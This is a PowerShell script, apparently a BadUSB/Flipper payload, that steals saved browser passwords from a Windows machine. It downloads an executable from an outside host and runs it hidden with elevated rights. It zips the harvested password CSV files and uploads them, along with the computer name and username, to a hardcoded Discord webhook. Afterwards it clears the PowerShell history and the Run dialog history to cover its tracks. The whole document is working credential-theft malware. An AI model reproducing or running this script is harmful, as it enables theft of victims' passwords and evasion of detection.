
#CHANGE URL TO YOUR URL
$url='https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC';
#Get PC Name+Date+Time
$namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"

#Download the payload
Invoke-WebRequest -Uri "http://pronobot.xyz/FLIPPER/bg0" -OutFile "$env:temp\bg0.exe" -UseBasicParsing -ErrorAction SilentlyContinue;

# Wait for the payload to finish
Start-Process "$env:temp\bg0.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction SilentlyContinue;
$p = Get-Process -Name "bg0" -ErrorAction SilentlyContinue;
Wait-Process -Id $p.Id -ErrorAction SilentlyContinue;

#Get Result Passwords
  #Result ZIP
  Add-Type -Assembly "System.IO.Compression.FileSystem" ;
  #search for all .csv files in the results folder
  $files = Get-ChildItem -Path "$env:temp\results\*" -Include *.csv -Recurse -ErrorAction SilentlyContinue;



  #Compress firefox files where stored passwords
  $compress = @{
    Path = $files
    CompressionLevel = "Fastest"
    DestinationPath = "$env:temp\$namepc.zip"
  }
  Compress-Archive @compress -Update
#Define zip to copy
$password = "$env:temp\$namepc.zip"

# Upload
cd $env:temp
# Send Name PC to Discord
$Body = @{
  content = "PC Name: $env:computername, User: $env:UserName"
}
Invoke-RestMethod -Uri $url -Method Post -Body ($Body | ConvertTo-Json -Depth 10) -ContentType "application/json"

# Send Result Passwords to Discord
curl.exe -i -F file=@"$password" $url

# Delete Files
#Remove-Item $password

# Delete Temp Files
#Remove-Item -Path "$env:temp\results\*" -Include *.csv -Force -Recurse
#Remove-Item $env:temp\bg0.exe -Force -Recurse
#Remove-Item $env:temp\up0.ps1 -Force -Recurse

# Clear History powershell:
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
# Clear run powershell:
  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
exit;
